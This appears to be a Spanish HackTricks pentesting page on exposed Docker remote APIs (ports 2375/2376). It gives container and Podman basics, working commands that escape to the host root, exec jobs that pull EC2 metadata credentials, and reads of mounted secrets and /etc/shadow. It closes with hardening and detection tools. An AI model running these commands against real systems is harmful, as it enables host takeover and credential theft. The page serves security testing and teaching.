# 2375, 2376 Pentesting Docker

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Conceptos B谩sicos de Docker

### 驴Qu茅 es?

La Plataforma Docker es la plataforma de contenedores l铆der en la industria para una innovaci贸n continua y de alta velocidad, que permite a las organizaciones construir y compartir cualquier aplicaci贸n de forma transparente, desde legado hasta lo que viene a continuaci贸n, y ejecutarlas de forma segura en cualquier lugar.

### Arquitectura b谩sica de Docker

* **[containerd](http://containerd.io)** es un tiempo de ejecuci贸n para contenedores que es capaz de **gestionar todo el ciclo de vida de un contenedor, incluida la transferencia y almacenamiento de im谩genes, as铆 como la ejecuci贸n, supervisi贸n y redes del contenedor**. **Se proporcionan m谩s detalles sobre containerd a continuaci贸n**.
* El manejo de contenedores sin cabeza es facilitado por container-shim, que sirve como intermediario. Espec铆ficamente, despu茅s de la inicializaci贸n de los contenedores por runc, el control se pasa al container-shim.
* **[runc](http://runc.io)** es reconocido como un tiempo de ejecuci贸n de contenedores ligero y universal que cumple con la especificaci贸n OCI. Es utilizado por containerd para iniciar y gestionar contenedores de acuerdo con las especificaciones OCI y representa una versi贸n renombrada de libcontainer.
* Con el prop贸sito de facilitar la comunicaci贸n entre containerd y el motor de docker, se emplea **[grpc](http://www.grpc.io)**.
* La especificaci贸n OCI para tiempo de ejecuci贸n e im谩genes es mantenida por **[OCI](https://www.opencontainers.org)**, con las versiones actuales de docker cumpliendo con las especificaciones de imagen y tiempo de ejecuci贸n de OCI.

### Comandos b谩sicos
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

Containerd fue dise帽ado para ser utilizado por Docker y Kubernetes, as铆 como por cualquier otra plataforma de contenedores que desee **abstraer las llamadas al sistema o la funcionalidad espec铆fica del sistema operativo para ejecutar contenedores** en Linux, Windows, Solaris u otros sistemas operativos. Con estos usuarios en mente, quer铆amos asegurarnos de que containerd tenga solo lo que necesitan y nada que no necesiten. Real铆sticamente, esto es imposible, pero al menos eso es lo que intentamos. Cosas como **la red est谩n fuera del alcance de containerd**. La raz贸n de esto es que, al construir un sistema distribuido, la red es un aspecto muy central. Con SDN y el descubrimiento de servicios hoy en d铆a, la red es mucho m谩s espec铆fica de la plataforma que abstraer las llamadas de netlink en Linux.

Ten en cuenta que **Docker utiliza Containerd, pero solo proporciona un subconjunto de las caracter铆sticas que Docker ofrece**. Por ejemplo, ContainerD no tiene las caracter铆sticas de gesti贸n de red de Docker, ni puedes usar ContainerD solo para crear enjambres de Docker.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

Un motor de contenedores de c贸digo abierto y compatible con OCI ([Open Container Initiative](https://github.com/opencontainers)) conocido como Podman es mantenido por Red Hat. Se caracteriza por varias distinciones clave con respecto a Docker, incluyendo su estructura sin daemon y el soporte para contenedores que no requieren acceso de root. La funci贸n principal de ambas herramientas es gestionar im谩genes y contenedores. Un objetivo notable de Podman es la compatibilidad con la API de Docker, lo que permite utilizar casi todos los comandos de la CLI de Docker dentro de Podman.

Dentro del ecosistema de Podman, se encuentran dos herramientas adicionales, Buildah y Skopeo. Buildah sirve como una herramienta de CLI para construir im谩genes de contenedores, mientras que Skopeo se utiliza para operaciones en im谩genes como push, pull o inspect. Para obtener m谩s informaci贸n sobre estas herramientas y su integraci贸n con Podman, [consulte su p谩gina de GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Diferencias Clave**

La diferencia m谩s significativa entre Docker y Podman radica en su dise帽o arquitect贸nico. Docker opera en un modelo cliente-servidor, lo que requiere el uso de la CLI de Docker para interactuar con un daemon en segundo plano responsable de la construcci贸n de im谩genes y la ejecuci贸n de contenedores, que opera con privilegios de root. En contraste, Podman emplea una arquitectura sin daemon, lo que permite que los contenedores se ejecuten bajo los privilegios del usuario iniciador sin necesidad de acceso de root. Este dise帽o asegura que los usuarios de Podman solo puedan interactuar con sus propios contenedores, sin un daemon compartido para la comunicaci贸n de la CLI.

Para dar cabida a la operaci贸n de contenedores en segundo plano sin un daemon, Podman se integra con **systemd**, permitiendo la gesti贸n de contenedores a trav茅s de unidades de systemd. Esta integraci贸n var铆a con la versi贸n de Podman, ofreciendo la capacidad de generar unidades tanto para contenedores existentes como para aquellos que a煤n no se han creado, as铆 como facilitando la operaci贸n de systemd dentro de los contenedores. A diferencia de Podman, Docker tradicionalmente depende de systemd para la gesti贸n de procesos de daemon.

Otra diferencia cr铆tica radica en la ejecuci贸n de contenedores. Podman permite que los contenedores se ejecuten con los privilegios del usuario iniciador, no bajo un daemon. Esto introduce el concepto de contenedores sin root, que pueden iniciarse sin acceso de root, ofreciendo una ventaja de seguridad significativa al limitar el impacto potencial de violaciones de contenedores. Los contenedores sin root garantizan que un atacante de un contenedor comprometido posea solo los privilegios de un usuario normal en el host, evitando la escalada de privilegios m谩s all谩 de los del usuario iniciador y mejorando as铆 la seguridad.


{% hint style="info" %}
Tenga en cuenta que dado que Podman tiene como objetivo admitir la misma API que Docker, puede utilizar los mismos comandos con Podman que con Docker, como:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## Informaci贸n B谩sica

El API remoto se ejecuta de forma predeterminada en el puerto 2375 cuando est谩 habilitado. El servicio, por defecto, no requerir谩 autenticaci贸n, lo que permite a un atacante iniciar un contenedor de Docker privilegiado. Al utilizar el API remoto, se puede adjuntar hosts / (directorio ra铆z) al contenedor y leer/escribir archivos del entorno del host.

**Puerto predeterminado:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## Enumeraci贸n

### Manual

Tenga en cuenta que para enumerar la API de Docker, puede utilizar el comando `docker` o `curl` como en el siguiente ejemplo:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Si puedes **contactar el API remoto de docker con el comando `docker`** puedes **ejecutar** cualquiera de los **comandos de docker** [**previamente comentados**](2375-pentesting-docker.md#basic-commands) para interactuar con el servicio.

{% hint style="info" %}
Puedes `export DOCKER_HOST="tcp://localhost:2375"` y **evitar** usar el par谩metro `-H` con el comando docker
{% endhint %}

#### Escalada r谩pida de privilegios
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

A veces ver谩s **2376** disponible para el punto final de **TLS**. No he podido conectarme a 茅l con el cliente de docker, pero puedes hacerlo con curl sin problemas para acceder a la API de docker.
```bash
#List containers
curl insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, its also worth checking out services in case they are adding secrets via environment variables)
curl -s insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Si deseas obtener m谩s informaci贸n al respecto, puedes encontrar m谩s informaci贸n en el sitio desde donde copi茅 los comandos: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### Autom谩tico
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Comprometiendo

En la siguiente p谩gina puedes encontrar formas de **escapar de un contenedor de Docker**:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

Abusando de esto es posible escapar de un contenedor, podr铆as ejecutar un contenedor d茅bil en la m谩quina remota, escapar de 茅l y comprometer la m谩quina:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## Escalaci贸n de privilegios

Si te encuentras dentro de un host que est谩 utilizando Docker, puedes [**leer esta informaci贸n para intentar elevar privilegios**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## Descubriendo secretos en contenedores Docker en ejecuci贸n
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Verifique **env** (secci贸n de variables de entorno) en busca de secretos y es posible que encuentres:

* Contrase帽as.
* IP's.
* Puertos.
* Rutas.
* Otros... .

Si deseas extraer un archivo:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## Asegurando tu Docker

### Asegurando la instalaci贸n y uso de Docker

* Puedes usar la herramienta [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) para inspeccionar tu instalaci贸n actual de Docker.
* `./docker-bench-security.sh`
* Puedes usar la herramienta [https://github.com/kost/dockscan](https://github.com/kost/dockscan) para inspeccionar tu instalaci贸n actual de Docker.
* `dockscan -v unix:///var/run/docker.sock`
* Puedes usar la herramienta [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) para conocer los privilegios que tendr谩 un contenedor al ejecutarse con diferentes opciones de seguridad. Esto es 煤til para comprender las implicaciones de usar ciertas opciones de seguridad para ejecutar un contenedor:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Asegurando Im谩genes de Docker

* Puedes usar una imagen de Docker de [https://github.com/quay/clair](https://github.com/quay/clair) para escanear tus otras im谩genes de Docker y encontrar vulnerabilidades.
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Asegurando Dockerfiles

* Puedes usar la herramienta [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) para **inspeccionar tu Dockerfile** y encontrar todo tipo de configuraciones incorrectas. A cada configuraci贸n incorrecta se le asignar谩 un ID, puedes encontrar aqu铆 [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) c贸mo corregir cada una de ellas.
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* Puedes usar la herramienta [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) para **inspeccionar tu Dockerfile** y encontrar todo tipo de configuraciones incorrectas.
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* Puedes usar la herramienta [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) para **inspeccionar tu Dockerfile** y encontrar todo tipo de configuraciones incorrectas.
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* Puedes usar la herramienta [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) para **inspeccionar tu Dockerfile** y encontrar todo tipo de configuraciones incorrectas.
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### Registrando Actividades Sospechosas

* Puedes usar la herramienta [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) para detectar **comportamientos sospechosos en contenedores en ejecuci贸n**.
* Observa en el siguiente fragmento c贸mo **Falco compila un m贸dulo del kernel e lo inserta**. Despu茅s de eso, carga las reglas y **comienza a registrar actividades sospechosas**. En este caso, ha detectado 2 contenedores privilegiados iniciados, 1 de ellos con un montaje sensible, y despu茅s de algunos segundos detect贸 c贸mo se abri贸 una shell dentro de uno de los contenedores.
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### Monitoreo de Docker

Puedes usar auditd para monitorear Docker.

# Referencias
* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
* [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
